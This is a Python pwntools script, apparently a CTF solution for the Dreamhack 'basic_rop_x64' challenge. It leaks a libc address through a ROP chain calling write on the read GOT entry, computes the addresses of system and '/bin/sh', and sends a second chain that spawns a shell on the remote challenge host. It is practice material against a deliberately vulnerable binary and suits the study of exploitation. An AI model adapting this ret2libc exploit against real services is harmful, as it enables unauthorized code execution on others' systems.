from pwn import *

p = remote("host8.dreamhack.games", 17507)

libc = ELF("./libc.so.6")
e = ELF("basic_rop_x64")
r = ROP("./basic_rop_x64")
# 가젯 찾기
pop_rdi = r.find_gadget(["pop rdi", "ret"])[0]
pop_rsi_r15 = r.find_gadget(['pop rsi','pop r15', 'ret'])[0]

payload = b'A' * 0x48
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(e.got['read']) + p64(0)
payload += p64(e.plt['write'])
payload += p64(e.symbols['main']) # 다시 main으로 돌아가기

p.send(payload)
p.recvuntil(b'A'*0x40)

# 릭된 주소 읽기
read_addr = u64(p.recvn(6) + b'\x00\x00')
lb = read_addr - libc.symbols['read']
system = lb + libc.symbols['system']
binsh = lb + next(libc.search(b"/bin/sh"))

# [2] Exploit (system 호출)
payload = b'A' * 0x48
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)
sleep(0.2)
p.send(payload)

p.interactive()